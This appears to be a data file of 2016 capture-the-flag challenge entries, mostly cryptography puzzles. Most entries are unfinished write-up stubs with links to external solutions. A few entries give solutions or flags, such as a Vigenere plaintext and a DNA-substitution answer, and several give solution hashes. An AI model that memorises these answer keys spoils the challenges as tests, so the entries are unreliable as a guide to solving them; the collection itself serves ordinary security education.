{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\decipher-me-100", "year": "2016", "name": "decipher-me-100", "writeup": "# Pragyan CTF 2016 : Decipher Me\n\n**Category:** Cryptography\n**Points:** 100\n**Solves:** \n**Description:**\n\n>  Ten years after the starship Voyager's return from the Delta Quadrant, the Federation is in a crisis. The Federation's main suppliers of dilithium crystals (the primary catalyst for the fuel used in faster-than-light travel) are disappearing. Space and time have folded around several planets, isolating them from outside contact. The phenomenon is unnatural â€“ someone or something is causing it to happen. And all they've got is this [file](./file). Can you help the Federation ?\n> \n>   [file](./file)  b7464c822fb2027935ac22237b944ae4\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\i-agree-20", "year": "2016", "name": "i-agree-20", "writeup": "# Pragyan CTF 2016 : I Agree\n\n**Category:** Cryptography\n**Points:** 20\n**Solves:** \n**Description:**\n\n>  Crack the cipher: vhixoieemksktorywzvhxzijqni\n> \n> \n>  Your clue is:\n> \n>  \"caesar is everything. But he took it to the next level.\"\n\n\n## Write-up\n\nFrom the Hint, it can be knew that it must be a Vigenere Cipher. There is Online Decipher for that: http://www.guballa.de/vigenere-solver\nThe solution would be `theforceisstrongwiththisone`\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\intercepted-transmission-70", "year": "2016", "name": "intercepted-transmission-70", "writeup": "# Pragyan CTF 2016 : Intercepted Transmission\n\n**Category:** Cryptography\n**Points:** 70\n**Solves:** \n**Description:**\n\n>  R4-D6 has intercepted an encrypted transmission from a nearby battle. You have to help him decrypt it and find the flag! R4-D6 did manage to hear a part of the transmission though \"Red five standing by\".\n> \n>  Hint! The \"red five standing by\" have started to attack the forts.\n> \n>   [file.wav](./file.wav)  7587e4af9bfb9a9c1b5de7635aaff70\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\kill-the-devil-60", "year": "2016", "name": "kill-the-devil-60", "writeup": "# Pragyan CTF 2016 : Kill the devil\n\n**Category:** Cryptography\n**Points:** 60\n**Solves:** \n**Description:**\n\n>  Kill the d3vil in 7he bud\n>\n> [Problem.txt](Problem.txt) c4c180572734214e630284d1d1476588\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\numbers-and-spaces-40", "year": "2016", "name": "numbers-and-spaces-40", "writeup": "# Pragyan CTF 2016 : Numbers and Spaces (40pts)\n\n**Category:** Cryptography\n**Points:** 40\n**Solves:** \n**Description:**\n\n>  Go for a fair consideration of the following NUMERS , but ignore the 'X's .\n> \n> \n>  EPQS PODY EPQS RYNY PODY EPQS RJTCDY RYNY RJTCDY EPQS RYNY RYNY\n> \n>   [morst_important.gif](./morst_important.gif)  d6920fff52658d7688586244fab7f3c7\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\rsa-encryption-25", "year": "2016", "name": "rsa-encryption-25", "writeup": "# Pragyan CTF 2016 : RSA_Encryption\n\n**Category:** Cryptography\n**Points:** 25\n**Solves:** \n**Description:**\n\n>  X has sent a message. Can you decrypt it?\n> \n>  The encrypted message and the public key used to encrypt it ( key1_data.txt ) are given to you.\n> \n>   [rsaq](./rsaq)  c1a24bf093d9187955495d7577971f03\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pwn2win-ctf-2016\\crypto\\simple-cryptography-60", "year": "2016", "name": "simple-cryptography-60", "writeup": "# Pwn2Win CTF : simple-cryptography-60\n\n**Category:** Crypto\n**Points:** 60\n**Solves:**\n**Description:**\nThe club decided to evolve the security of communication for something more efficient and simple to be implemented â€¦ simply too much!\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://www.xil.se/post/pwn2win-2016-simple-crypto-rspkt/\n* [Dragon Sector](http://dragonsector.pl/docs/pwn2win2016_writeups.pdf)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\1-200", "year": "2016", "name": "1-200", "writeup": "# Qiwi Infosec CTF 2016 : 1-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\1-300", "year": "2016", "name": "1-300", "writeup": "# Qiwi Infosec CTF 2016 : 1-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P=NP Team](https://pequalsnp-team.github.io/writeups/crypto300_1)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\1-400", "year": "2016", "name": "1-400", "writeup": "# Qiwi Infosec CTF 2016 : 1-400\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P=NP Team](https://pequalsnp-team.github.io/writeups/crypto400_1)\n* [Jules Tucker](https://github.com/JulesDT/ctfWriteUps/tree/master/Qiwi-Infosec%20%20CTF%202016/Crypto%20400_1)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\2-300", "year": "2016", "name": "2-300", "writeup": "# Qiwi Infosec CTF 2016 : 2-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\2-400", "year": "2016", "name": "2-400", "writeup": "# Qiwi Infosec CTF 2016 : 2-400\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Qmet Group](https://github.com/Qmet-Group/QiwiCTF-Writeup/blob/master/c400.py)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\3-100", "year": "2016", "name": "3-100", "writeup": "# Qiwi Infosec CTF 2016 : 3-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n> The flag is a plaintext\n> **Ciphertext**: `GGTTCAATGGGCTTGTCAATGGTTCGCATATCCATGGGCACGGTTCGCGGCTCA`\n> **Hint 1:**: Change space to `_`\n\n## Write-up\n\nA brief look at the stream of letters in our ciphertext indicates there are only four characters that occur. With either a bit of Googling or by previous education, we can determine the four letters represent the four nucleobases in DNA:\n\n> C = Cytosine\n\n> G = Guanine\n\n> A = Adenine\n\n> T = Thymine\n\nUnfortunately, this information alone does not tell us how to decrypt the message. Googling `DNA Encryption` or `DNA Cryptography` brings up some interesting pages, but taking a look inside the images Google provides, gives us better insight into the encryption scheme. Within the first ten images, this substitution key appears:\n\n![Cipher Key](http://www.polestarltd.com/ttg/isspeeches/051403/slide14.jpg)\n\nSubstituting the nucleobase sequences with their plaintext counterparts (by hand or by computer) gives you `FRIEDRICH MIESCHER`, which by nature of the challenge's hint becomes your flag: `FRIEDRICH_MIESCHER`\n\n## Other write-ups and resources\n\n* [U.S. Coast Guard Academy](https://github.com/USCGA/writeups/tree/master/online_ctfs/qiwi_infosec_ctf_2016/crypto_100_3_COMPLETE)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\3-300", "year": "2016", "name": "3-300", "writeup": "# Qiwi Infosec CTF 2016 : 3-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Grazfather](http://grazfather.github.io/ctf/re/2016/11/18/QiwiCTF-RE300_3.html)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\400", "year": "2016", "name": "400", "writeup": "# Qiwi Infosec CTF 2016 : 400\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\qiwi-infosec-ctf-2016\\crypto\\5-200", "year": "2016", "name": "5-200", "writeup": "# Qiwi Infosec CTF 2016 : 5-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:**\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\crypto\\agent-g-500", "year": "2016", "name": "agent-g-500", "writeup": "# RC3 CTF 2016 : agent-g-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> Agent G: We have a mission for you. The fate of the nation could very depend on your assistance! These channels are not secure; if you wish to accept the mission you must first find our more secure transmission.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Team Contagion](https://github.com/TeamContagion/CTF-Write-Ups/tree/master/Crypto/crypto/agent-g)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\crypto\\calculus-200", "year": "2016", "name": "calculus-200", "writeup": "# RC3 CTF 2016 : calculus-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:**\n**Description:**\n\n> Missing. There was a shared Google document link in view mode.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [s0h3ck](https://github.com/s0h3ck/h3ck-c0ding/blob/master/CTFs/RC3%20CTF%202016/README.md#calculus)\n* [Ethical Hackers Club](https://ethicalhackers.club/rc3-ctf-2016-write-ups/#Calculus)\n* [T4hu](https://ctftime.org/writeup/4769)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\crypto\\cats-300", "year": "2016", "name": "cats-300", "writeup": "# RC3 CTF 2016 : cats-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [s0h3ck](https://github.com/s0h3ck/h3ck-c0ding/blob/master/CTFs/RC3%20CTF%202016/README.md#cats)\n* [Ethical Hackers Club](https://ethicalhackers.club/rc3-ctf-2016-write-ups/#Cats)\n* [T4hu](https://ctftime.org/writeup/4808)\n* [Zero Dimension](http://lauricesite.blogspot.tw/2016/11/2016-rc3-ctf-writeup-cats-crypto-300.html)\n* [Nacayoshi](https://nacayoshi00.wordpress.com/2016/11/22/rc3-ctf-2016/)\n* [Aneesh Kotnana](https://github.com/Alaska47/RC3CTF-2016-Writeups/tree/master/crypto/300-Cats)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\crypto\\my-game-400", "year": "2016", "name": "my-game-400", "writeup": "# RC3 CTF 2016 : my-game-400\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n> Letters intertwined\n>\n> The end, recombined.\n>\n> Awake, lying blinking,\n>\n> Intensely thinking.\n>\n> Muse and proclaim...\n>\n> â€œItâ€™s my game!â€\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [s0h3ck](https://github.com/s0h3ck/h3ck-c0ding/blob/master/CTFs/RC3%20CTF%202016/README.md#my-game)\n* [Alexey Ryabov](http://f4lrik.ru/en/my-game-crypto-400-rc3-ctf/)\n* [Aneesh Kotnana](https://github.com/Alaska47/RC3CTF-2016-Writeups/tree/master/crypto/400-My-Game)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\crypto\\salad-100", "year": "2016", "name": "salad-100", "writeup": "# RC3 CTF 2016 : salad-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n> â€œThe fault, dear Brutus, is not in our stars, but in ourselves.â€ (I.ii.141) Julius Caesar in William Shakespeareâ€™s Julius Caesar\n>\n>\n> Cipher Text: 7sj-ighm-742q3w4t\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [s0h3ck](https://github.com/s0h3ck/h3ck-c0ding/blob/master/CTFs/RC3%20CTF%202016/README.md#salad)\n* [Indonesian Coder](http://blog.indonesiancoder.com/)\n* [Rick](https://github.com/rickvg/RC3-Fall-CTF-2016-write-ups/tree/master/Write-up-Salad)\n* [Binary Studio](https://binarystud.io/rc3-ctf-2016-salad-crypto-100.html)\n* [s0h3ck](https://github.com/s0h3ck/h3ck-c0ding/blob/master/CTFs/RC3%20CTF%202016/README.md#salad)\n* [Nacayoshi](https://nacayoshi00.wordpress.com/2016/11/22/rc3-ctf-2016/)\n* [Zero Dimension](http://lauricesite.blogspot.tw/2016/11/2016-rc3-writeup-salad-crypto-100.html)\n* [Aneesh Kotnana](https://github.com/Alaska47/RC3CTF-2016-Writeups/tree/master/crypto/100-Salad)\n* [0xd13a](https://0xd13a.github.io/ctfs/rc3ctf2016/salad)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rc3-ctf-2016\\reversing\\rc3cipher-350", "year": "2016", "name": "rc3cipher-350", "writeup": "# RC3 CTF 2016 : rc3cipher-350\n\n**Category:** Reversing\n**Points:** 350\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Swiss Cyber Storm](https://github.com/swisscyberstorm/cft_write_ups/tree/master/2016/rc3ctf/reversing/rc3cipher)\n* [Inndy](https://gist.github.com/Inndy/eca85d80f9e03260d35bff5c1c22b6b1)\n* [Zero Dimension](https://github.com/CTFwriteup-ZeroDimension/RC3-2016/tree/master/RC3Cipher)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rhme2-2016\\crypto\\key-server-200", "year": "2016", "name": "key-server-200", "writeup": "# RHME2 : Key Server\n\n**Category:** Write-Ups-2016\n**Points:** 200\n**Solves:** 38\n**Description:**\n\n> We have received a portable asymmetric key storage for evaluation purposes. This portable device was manufactured by Ebian Corp to facilitate secure communications with customers. It generates and stores adminstrators' public keys. Customers can use this repository to find the public key of the admin they want to contact, and administrators can use this repository to update their key information. If this fancy keychain passes the test we are going to give them away like candy, secure candy.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rhme2-2016\\crypto\\secure-filesystem-100", "year": "2016", "name": "secure-filesystem-100", "writeup": "# RHME2 : Secure Filesystem\n\n**Category:** Write-Ups-2016\n**Points:** 100\n**Solves:** 45\n**Description:**\n\n> We don't remember why, but we wanted a file system on an AVR328p. After the system was completed we discovered that it lacked basic security. A couple of beers later we came up with what we think is a revolutionary way to do file system permissions. It is now your task to fill in our shoes and test its security.\n> \n> \n> The filesystem allows you to request the contents of one or more available files by using the following\n> \n> format:\n> \n> \n> token#<filename>[:<filename>]\n> \n> \n> So for example, a request would be:\n> \n> \n> 933d86ae930c9a5d6d3a334297d9e72852f05c57#cat.txt:finances.csv\n> \n> \n> Some example files (token | call):\n> \n> \n> 96103df3b928d9edc5a103d690639c94628824f5 | cat.txt\n> \n> 933d86ae930c9a5d6d3a334297d9e72852f05c57 | cat.txt:finances.csv\n> \n> 83f86c0ba1d2d5d60d055064256cd95a5ae6bb7d | cat.txt:finances.csv:joke.txt\n> \n> ba2e8af09b57080549180a32ac1ff1dde4d30b14 | cat.txt:joke.txt\n> \n> 0b939251f4c781f43efef804ee8faec0212f1144 | finances.csv\n> \n> 4b0972ec7282ad9e991414d1845ceee546eac7a1 | finances.csv:joke.txt\n> \n> 715b21027dca61235e2663e59a9bdfb387ca7997 | joke.txt\n> \n> \n> Can you access any file you're not supposed to?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\rhme2-2016\\crypto\\secure-filesystem-v1.92r1-150", "year": "2016", "name": "secure-filesystem-v1.92r1-150", "writeup": "# RHME2 : Secure Filesystem v1.92r1\n\n**Category:** Write-Ups-2016\n**Points:** 150\n**Solves:** 17\n**Description:**\n\n> After the horrible debacle of the first file system, we got together again, invited our friend Mr. Wodka and waterproofed the secure file system. You can test it again, but this time it uses unbreakable encryption.\n> \n> \n> The filesystem allows you to request the contents of one or more available files by using the following\n> \n> format:\n> \n> \n> token#<filename>[:<filename>]\n> \n> \n> So for example, a request would be:\n> \n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a3a3a9b3cc5239fdf4572157296903a0237a4aaeeaa8f3d15#joke.txt\n> \n> \n> Some example files (token | call):\n> \n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> dfd0f4a25b7d529e89ac030c2b681e93831e95a8186823b9 | cat.txt\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> f2bca35d472116dc6d5bebe96f1a3af249be78c63219a0dc | cat.txt:finances.csv\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> 7eed666977d3861dbaefd16b2ed7dc5b639e51853ca6e7b3 | cat.txt:finances.csv:joke.txt\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> 51d915246394ce976f8768cf3300087cb5b9958bbec30f9c | cat.txt:joke.txt\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> ae2a5a38b4d03f0103bce59874e41a0df19cb39b328b02fa | finances.csv\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> c66b5e48f5e600982724eca3804fb59b7b0f395a6e17e1ce | finances.csv:joke.txt\n> \n> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |\n> \n> 3a3a9b3cc5239fdf4572157296903a0237a4aaeeaa8f3d15 | joke.txt\n> \n> \n> Can you access any file you're not supposed to?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\ed25519-40", "year": "2016", "name": "ed25519-40", "writeup": "# sCTF 2016 Q1 : ed25519-40\n\n**Category:** Crypto\n**Points:** 40\n**Solves:** 15\n**Description:**\n\nEd25519-sign the flag with the same private key and implementation flaw used to sign the messages below. The flag is the base64 representation of the signature.\n\nPublic key: `5bfcb1cd3938f3f6f3092da5f7d7a1bdb1d694a725d0585a99208787554e110d`\n\nMessage: sctf.io\nSignature: `68299a51b6b592e2db83c26ca3594bdd81bdbb9f11c597a1deb823da7c8b9de8e2224855125b1acbeab1468bf4860c1eeb05b6d2375e2214c55bdfe808a6c106`\n\nMessage: 2016 Q1\nSignature: `68299a51b6b592e2db83c26ca3594bdd81bdbb9f11c597a1deb823da7c8b9de825ad01a05a0cce69258d41d42ed046956e7d4586eb21ff031bf8ac03243d5e04`\n\n\nSHA512 Solution Hash(es):\n* fe13e9a58c471dc3d0a6af59c3ba6b6250f68e230570cd102089acb41cf812dcfa615f8862853dd1fb9fed997ea003f2\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/3193\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\lengthy-lingo-35", "year": "2016", "name": "lengthy-lingo-35", "writeup": "# sCTF 2016 Q1 : lengthy-lingo-35\n\n**Category:** Crypto\n**Points:** 35\n**Solves:** 231 \n**Description:**\n\nCan you crack the code? We intercepted this flag but can't seem to figure out how it was encrypted.\n\n\nSHA512 Solution Hash(es):\n* c970d34767a754b8f7794c21499e55285055e4eac50854c501a9c271daa8ca296f9cb22d0fb3bfea448dfad5\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Lengthy-Lingo\n* https://github.com/318br/sctf/tree/master/2016q1/LengthyLingo\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\pythagoras-hash-100", "year": "2016", "name": "pythagoras-hash-100", "writeup": "# sCTF 2016 Q1 : pythagoras-hash-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 9\n**Description:**\n\nYou have part of the source to a really bad hash function, and an oracle that will hash anything up to 32 bytes. Hash the following string.\n\nthe flag the flag the flag the flag the flag the flag the flag the game\n\n*(71 bytes â€” sorry, the oracle will not hash it for you)*\n\nYou may access the oracle at <http://problems1.2016q1.sctf.io:17117/>. The oracle accepts a base64-encoded input passed via the query string. You can interface with the oracle using your browser (e.g. <http://problems1.2016q1.sctf.io:17117/?dGhlIGZsYWc=)>, cURL, or anything you want, really.\n\n    $ hash() { curl 'http://problems1.2016q1.sctf.io:17117/?'\\\"$(echo -n $1 | base64)\\\"; }\n    $ hash 'the flag'\n    d0d27218a363a192\n\n\nSHA512 Solution Hash(es):\n* f066d440d0184c9beb3d6d939fa7c950b1d5eaa8bce6b12fca30b0d1315f4dbce95aed328b0a2576aa548016e922555690285d270e3cb5569e45b77ce675fc84\n\n**Hint**\nSliding window\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\verticode-90", "year": "2016", "name": "verticode-90", "writeup": "# sCTF 2016 Q1 : verticode-90\n\n**Category:** Crypto\n**Points:** 90\n**Solves:** 270\n**Description:**\n\nWelcome to Verticode, the new method of translating text into vertical codes.\n\nEach verticode has two parts: the `color shift` and the `code`.\n\nThe code takes the inputted character and translates it into an ASCII code, and then into binary, then puts that into an image in which each black pixel represents a 1 and each white pixel represents a `0`.\n\nFor example, `A is 65` which is `1000001` in binary, `B is 66` which is `1000010`, and `C is 67` which is `1000011`, so the corresponding verticode would look like [this](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/A-Code.png).\n\nExcept, it isn't that simple.\n\nA color shift is also integrated, which means that the color before each verticode shifts the ASCII code, by adding the number that the color corresponds to, before translating it into binary. In that case, the previous verticode could also look like [this](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/B-Code.png).\n\nThe table for the color codes is:\n\n0 = Red  \n1 = Purple  \n2 = Blue  \n3 = Green  \n4 = Yellow  \n5 = Orange  \n\nThis means that a red color shift for the letter `A`, which is `65 + 0 = 65`, would translate into `1000001` in binary; however, a green color shift for the letter `A`, which is `65 + 3 = 68`, would translate into `1000100` in binary.\n\nGiven [this verticode](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/code1.png), read the verticode into text and find the flag.\n\nNote that the flag will not be in the typical `sctf{flag}` format, but will be painfully obvious text. Once you find this text, you will submit it in the `sctf{text}` format. So, if the text you find is adunnaisawesome, you will submit it as `sctf{adunnaisawesome}`.\n\n\nSHA512 Solution Hash(es):\n* 2daf3b3818d0ccb51134f7875fe3fd2221657151de15c5ca39a1902fbe81104e40e3fb4f6d27bbfd85b7445c4566153de1388dffac10608b7102fa8988b89fe7\n\n**Hint**\nTry looking up some imaging libraries.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Verticode\n* https://github.com/318br/sctf/tree/master/2016q1/Verticode\n* http://hack.carleton.team/2016/04/18/sctf-io-2016-q1-verticode-90-points/\n* [iPush](http://ipushino.blogspot.com/2016/04/sctf-2016-q-verticode-crypto.html)\n* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/verticode_90_pts.html\n* https://pequalsnp-team.github.io/writeups/verticode\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\vertinet-140", "year": "2016", "name": "vertinet-140", "writeup": "# sCTF 2016 Q1 : vertinet-140\n\n**Category:** Crypto\n**Points:** 140\n**Solves:** 180\n**Description:**\n\nThis problem follows the same specifications as the previous Verticode problem, except that you have to solve many of them by developing a client to communicate with the server available at problems1.2016q1.sctf.io:50000. Good luck.\n\n\nSHA512 Solution Hash(es):\n* f452d709fddad3bd936776682cc11127373e4c1ca80c51be1a59ae79d6f2d08669e51152dac5bc2b28cd96c18ad7\n\n**Hint**\nTry looking up some imaging libraries as well as some networking stuff.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Vertinet\n* https://github.com/318br/sctf/tree/master/2016q1/Vertinet\n* https://pequalsnp-team.github.io/writeups/vertinet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sctf-2016-q1\\crypto\\when-in-rome-10", "year": "2016", "name": "when-in-rome-10", "writeup": "# sCTF 2016 Q1 : when-in-rome-10\n\n**Category:** Crypto\n**Points:** 10\n**Solves:** 1284\n**Description:**\n\nI heard of a cipher named after Julius Caesar, and I want you to try it out! Try decoding this message:\n\n    Nvctfdv kf jTKW! Nv yfgv pfl veafp kyv gifscvdj nv yrmv nizkkve wfi kyv wzijk hlrikvi fw 2016. Yviv zj pfli wzijk fw (yfgvwlccp) drep wcrxj! jtkw{ny3e_1e_tkw_u0_r5_tkw3i5_u0}\n\nSHA512 Solution Hash(es):\n* 37350cd2d209bc415a440d5ccb31583269fd679dd10a527df5c95153ec64f19d39c12ba42fb39809a07373\n\n**Hint**\n[This](http://rumkin.com/tools/cipher/) website might help.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://hack.carleton.team/?p=50&preview=true\n* http://bryceandress.github.io/2016/04/11/sctf2016-when-in-rome.html\n"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016", "year": "2016", "name": "seccon-ctf-quals-2016", "writeup": "# SECCON CTF Quals 2016 write-ups\n\n* <https://score-quals.seccon.jp/>\n* [Scoreboard](http://ranking.quals.seccon.jp/) or [local alternative](TODOLOCAL)\n\n## Completed write-ups\n\n* [exploit/jmper-300](exploit/jmper-300)\n\n## External write-ups only\n\n* [forensic/randomware-300](forensic/randomware-300)\n* [forensic/memory-analysis-100](forensic/memory-analysis-100)\n* [forensic/voip-100](forensic/voip-100)\n* [binary/retrospective-200](binary/retrospective-200)\n* [binary/anti-debugging-100](binary/anti-debugging-100)\n* [binary/obfuscated-aes-500](binary/obfuscated-aes-500)\n* [binary/microcomputer-500](binary/microcomputer-500)\n* [binary/ropsynth-400](binary/ropsynth-400)\n* [binary/lost-decryption-200](binary/lost-decryption-200)\n* [crypto/vigenere-100](crypto/vigenere-100)\n* [exploit/mboard-500](exploit/mboard-500)\n* [exploit/cheer-msg-100](exploit/cheer-msg-100)\n* [exploit/tinypad-300](exploit/tinypad-300)\n* [exploit/missle-400](exploit/missle-400)\n* [exploit/chat-500](exploit/chat-500)\n* [exploit/logger-300](exploit/logger-300)\n* [exploit/checker-300](exploit/checker-300)\n* [exploit/shopping-400](exploit/shopping-400)\n* [web/uncomfortable-web-300](web/uncomfortable-web-300)\n* [web/pppppoxy-200](web/pppppoxy-200)\n* [web/basiq-100](web/basiq-100)\n* [web/biscuiti-300](web/biscuiti-300)\n\n## Missing write-ups\n\n* [crypto/backpackers-capricious-cipher-200](crypto/backpackers-capricious-cipher-200)\n* [crypto/png-over-telegraph-300](crypto/png-over-telegraph-300)\n* [crypto/alphacomplex2-500](crypto/alphacomplex2-500)\n* [crypto/alphacomplex1-300](crypto/alphacomplex1-300)"}
{"source": "write-ups-2016", "category": "ECC", "path": "data\\write-ups-2016\\seccon-ctf-quals-2016\\binary\\anti-debugging-100", "year": "2016", "name": "anti-debugging-100", "writeup": "# SECCON CTF Quals 2016 : anti-debugging-100\n\n**Category:** Binary\n**Points:** 100\n**Solves:** 387\n**Description:**\n\nReverse it.\n[bin](bin)\nmay some AV will alert,but no problem.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://nacayoshi00.wordpress.com/2016/12/12/seccon-2016-online-writeup/\n* https://0xd13a.github.io/ctfs/seccon2016/anti-debugging\n* https://youtu.be/hzJsqIqyZk0\n* https://github.com/Inndy/ctf-writeup/tree/master/2016-seccon/anti-debugging\n* https://www.youtube.com/watch?v=uvi7zoLF8kw\n* https://blog.nhiroki.net/2016/12/11/seccon-2016-online-ctf-writeup\n"}
